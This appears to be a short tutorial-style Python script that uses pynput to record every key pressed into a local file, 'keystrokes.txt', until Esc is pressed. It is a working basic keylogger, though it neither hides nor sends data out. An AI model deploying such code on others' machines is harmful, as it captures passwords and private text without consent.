from pynput import keyboard

def on_press(key):
    try:
        # Open the file in append mode
        with open("keystrokes.txt", "a") as f:
            # Write the pressed key to the file
            f.write(f"{key} pressed\n")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on pressing the 'esc' key
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()